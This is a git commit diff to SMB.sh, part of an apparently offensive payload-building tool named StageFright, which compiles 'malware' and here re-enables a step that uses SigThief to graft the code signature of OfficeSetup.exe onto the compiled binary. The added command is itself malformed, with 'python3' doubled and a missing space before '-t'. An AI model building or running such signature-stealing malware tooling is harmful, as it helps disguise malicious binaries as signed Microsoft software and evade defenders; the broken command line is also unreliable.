20b1bc5e08841cc95d86090f03495b5d5460d687
assume-breach <76174163+assume-breach@users.noreply.github.com>
2023-12-01 09:48:28 -0500

    Update SMB.sh

--- StageFright/StageFright/StageFright/SMB/SMB.sh
+++ StageFright/StageFright/StageFright/SMB/SMB.sh
@@ -178,12 +178,13 @@ rm shell*
 echo -e ${yellow}"***Malware Compiled***"${clear}
 echo ""
 sleep 2
-#echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
-#echo ""
-#sleep 2
-#python3 StageFright/StageFright/ResourcesSigThief/sigthief.py -i StageFright/StageFright/SMB/Resources/OfficeSetup.exe #-t $MALWARE -o signed$MALWARE >/dev/null 2>&1
-#mv signed$MALWARE $MALWARE
-#echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
-#echo ""
+echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
+echo ""
+sleep 2
+python3 python3 StageFright/Resources/SigThief/sigthief.py -i StageFright/Resources/OfficeSetup.exe-t $MALWARE -o signed$MALWARE >/dev/null 2>&1
+mv signed$MALWARE $MALWARE
+echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
+echo ""
+
 
 
